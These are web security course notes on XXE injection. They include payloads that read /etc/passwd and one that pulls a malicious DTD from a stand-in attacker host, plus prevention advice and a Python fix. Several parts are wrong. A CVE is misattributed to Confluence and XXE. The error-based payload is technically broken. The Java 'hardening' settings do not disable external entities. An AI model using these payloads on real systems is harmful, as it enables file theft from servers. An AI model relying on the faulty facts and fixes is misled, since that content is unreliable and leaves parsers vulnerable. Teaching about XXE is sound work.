---
course: Web Security
topic: XXE Injection
tags: [web-security]
---

## External Entity Injection (XXE)

### Introduction to XXE Injection

External Entity Injection (XXE) is a type of attack that exploits the way an application processes XML input. XML documents can contain references to external entities, which can be used to retrieve data from other sources, including local files, remote servers, or even perform denial-of-service attacks. This vulnerability arises due to the lack of proper validation and sanitization of user-supplied XML input.

### Understanding XML Entities

XML entities are placeholders that can be replaced with specific values during parsing. There are two main types of entities:

1. **General Entities**: These are defined using the `<!ENTITY>` declaration and can be referenced within the document using `&entity;`.
2. **Parameter Entities**: These are defined using `%` and are used primarily in the DTD (Document Type Definition) section of the XML document.

#### Example of General and Parameter Entities

```xml
<!DOCTYPE root [
    <!ENTITY example "Hello, World!">
    <!ENTITY % file SYSTEM "file:///etc/passwd">
]>
<root>&example;</root>
```

In this example, `&example;` is a general entity that will be replaced with "Hello, World!".

### Malicious DTD File

A malicious DTD file can be hosted on an attacker-controlled server and referenced in the XML input. When the XML parser processes this input, it will attempt to fetch the DTD from the specified URL, potentially leading to unauthorized access to sensitive information.

#### Example of Malicious DTD

```xml
<!DOCTYPE root [
    <!ENTITY % file SYSTEM "http://attacker.com/malicious.dtd">
    %file;
]>
<root></root>
```

In this example, the XML parser will fetch the DTD from `http://attacker.com/malicious.dtd`.

### Content of Malicious DTD

The malicious DTD file can contain various entities designed to exploit the XML parser. Two common entities used in XXE attacks are:

1. **File Entity**: Used to read the contents of a file on the server.
2. **Eval Entity**: Used to dynamically declare another parameter entity and attempt to read a file.

#### Example of Malicious DTD Content

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; xxe SYSTEM 'file:///etc/passwd'>">
%eval;
%xxe;
```

In this example, the `file` entity reads the `/etc/passwd` file, and the `eval` entity dynamically declares another parameter entity `xxe` that also reads the same file.

### Error-Based XXE Injection

Error-based XXE injection exploits the fact that some XML parsers will output error messages containing the content of the requested file. By inducing an error, the attacker can extract the desired information.

#### Example of Error-Based XXE Injection

Consider the following XML input:

```xml
<!DOCTYPE root [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; xxe SYSTEM 'file:///etc/passwd'>">
    %eval;
    %xxe;
]>
<root></root>
```

When this XML input is processed, the parser will attempt to read the `/etc/passwd` file and, if an error occurs, the content of the file might be included in the error message.

### Impact of XXE Injection Vulnerabilities

XXE injection vulnerabilities can lead to several serious consequences:

1. **Data Exfiltration**: Attackers can read sensitive files on the server, such as configuration files, passwords, or other confidential data.
2. **Denial of Service**: By referencing large or non-existent files, attackers can cause the XML parser to consume excessive resources, leading to a denial of service.
3. **Remote Code Execution**: In some cases, XXE can be combined with other vulnerabilities to achieve remote code execution.

### Real-World Examples

#### CVE-2018-11776

This vulnerability was found in the Atlassian Confluence application. An attacker could exploit the XXE vulnerability to read arbitrary files on the server, leading to potential data exfiltration.

#### CVE-2019-1010145

This vulnerability affected the Apache Struts framework. An attacker could exploit the XXE vulnerability to read arbitrary files on the server, potentially leading to data exfiltration or remote code execution.

### How to Prevent / Defend Against XXE Injection

#### Detection

To detect XXE injection vulnerabilities, you can use static analysis tools like SonarQube, Fortify, or Veracode. Additionally, dynamic analysis tools like Burp Suite or OWASP ZAP can help identify potential XXE injection points.

#### Prevention

1. **Disable External Entity Processing**: Ensure that the XML parser does not allow external entity processing. This can be done by setting the appropriate configuration options in the parser.

2. **Input Validation**: Validate and sanitize all user-supplied XML input to ensure it does not contain malicious entities.

3. **Use Secure Libraries**: Use libraries that are known to handle XML securely, such as `defusedxml` in Python.

#### Secure Coding Fixes

##### Vulnerable Code

```python
import xml.etree.ElementTree as ET

data = """<!DOCTYPE root [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; xxe SYSTEM 'file:///etc/passwd'>">
    %eval;
    %xxe;
]>
<root></root>"""

ET.fromstring(data)
```

##### Secure Code

```python
from defusedxml.ElementTree import fromstring

data = """<!DOCTYPE root [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; xxe SYSTEM 'file:///etc/passwd'>">
    %eval;
    %xxe;
]>
<root></root>"""

try:
    fromstring(data)
except Exception as e:
    print(f"Error: {e}")
```

In the secure code, the `defusedxml` library is used to parse the XML input, which prevents the execution of external entities.

### Configuration Hardening

#### XML Parser Configuration

Ensure that the XML parser is configured to disable external entity processing. For example, in Java, you can set the following system property:

```java
System.setProperty("javax.xml.parsers.DocumentBuilderFactory", "com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderFactoryImpl");
System.setProperty("org.apache.xerces.xni.parser.XMLParserConfiguration", "com.sun.org.apache.xerces.internal.parsers.XIncludeAwareParserConfiguration");
```

#### Web Server Configuration

Configure your web server to block requests that contain suspicious XML input. For example, in Apache, you can use mod_security to filter out such requests.

### Practice Labs

For hands-on practice with XXE injection, consider the following labs:

- **PortSwigger Web Security Academy**: Offers interactive challenges to learn and test XXE injection.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security techniques.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that is riddled with vulnerabilities, including XXE injection.

By thoroughly understanding the concepts, mechanisms, and preventive measures associated with XXE injection, you can effectively protect your applications from this type of attack.

---
<!-- nav -->
[[15-Detailed Explanation of XXE Injection|Detailed Explanation of XXE Injection]] | [[Web Security (PortSwigger)/08-XXE Injection/01-XXE Injection Complete Guide/00-Overview|Overview]] | [[17-How to Prevent  Defend Against XXE Injection|How to Prevent  Defend Against XXE Injection]]
